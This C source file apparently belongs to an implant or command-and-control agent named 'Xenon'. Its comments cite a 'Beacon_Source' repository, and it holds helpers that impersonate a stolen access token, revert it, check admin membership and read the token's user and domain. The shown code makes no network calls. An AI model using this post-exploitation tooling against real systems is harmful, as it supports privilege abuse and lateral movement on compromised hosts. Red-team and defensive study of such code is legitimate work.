/*
    Includes functions related to Identity Tokens and manipulation.
*/

#include "Xenon.h"

#include "Identity.h"


HANDLE gIdentityToken;
// BOOL gIdentityIsLoggedIn;

WCHAR* gIdentityDomain;
// WCHAR* gIdentityUsername;
// WCHAR* gIdentityPassword;
PPARSER gIdentityCredentialsParser;


/**
 * @brief Impersonate the token currently at the global HANDLE.
 * @ref https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/identity.c#L409
 */
VOID IdentityImpersonateToken(void)
{
	if (gIdentityToken) {
		ImpersonateLoggedOnUser(gIdentityToken);
	}
}

/**
 * @brief Drops the current thread token. Cleans up other state information about the token as well.
 * @ref https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/identity.c#L172
 */
VOID IdentityAgentRevertToken(void)
{
	// If there is an already stolen token, close its handle.
	if (gIdentityToken) {
		CloseHandle(gIdentityToken);
	}

	// Reset the token.
	gIdentityToken = NULL;

	// Revert to the self security context (that is, drop the stolen token from the current thread)
	RevertToSelf();

	// Free the memory allocated for the credentials format.
	// if (gIdentityCredentialsParser) {
	// 	ParserDestroy(gIdentityCredentialsParser);
	// 	memset(&gIdentityDomain, 0, IDENTITY_MAX_WCHARS_DOMAIN);
	// }
}

/**
 * @brief Checks if the current user running the code has administrative privileges.
 * @ref https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/identity.c#L196
 * @return TRUE if Beacon is in a high-integrity context, FALSE otherwise.
 */
BOOL IdentityIsAdmin(void)
{
	// Define the SID_IDENTIFIER_AUTHORITY structure and initialize it with the SECURITY_NT_AUTHORITY constant.
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

	// Allocate and initialize a security identifier (SID) for the built-in administrators group.
	PSID sid;
	if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid))
		return FALSE;

	// Check if the current token (security context) is a member of the specified group SID.
	BOOL isAdmin;
	if (!CheckTokenMembership(NULL, sid, &isAdmin)) {
		FreeSid(sid);
		return FALSE;
	}

	// Free the allocated SID and return the result.
	FreeSid(sid);
	return isAdmin;
}

/**
 * @brief Retrieves the username associated with the given token handle.
 * @ref https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/identity.c#L25
 * @param [in] hToken The handle to the token.
 * @param [out] buffer The buffer to store the username.
 * @param [in] size The size of the buffer.
 * @return Returns TRUE if the username is successfully retrieved, FALSE otherwise.
 */
BOOL IdentityGetUserInfo(_In_ HANDLE hToken, _Out_ char* buffer, _In_ int size)
{
	TOKEN_USER tokenInfo[0x1000];
	SID_NAME_USE sidType;
	DWORD returnLength;

	// Get the token information for the given token handle.
	if (!GetTokenInformation(hToken, TokenUser, tokenInfo, sizeof(tokenInfo), &returnLength))
		return FALSE;

	CHAR name[0x200] = { 0 };
	CHAR domain[0x200] = { 0 };

	DWORD nameLength = sizeof(name);
	DWORD domainLength = sizeof(domain);

	// Lookup the account SID to retrieve the username and domain.
	if (!LookupAccountSidA(NULL, tokenInfo->User.Sid, name, &nameLength, domain, &domainLength, &sidType))		// sidType: [out] peUse (required)
		return FALSE;


	// Format the username in the format "domain\username" and store it in the buffer.
	snprintf(buffer, size, "%s\\%s", domain, name);
	buffer[size - 1] = 0;
	return TRUE;
}
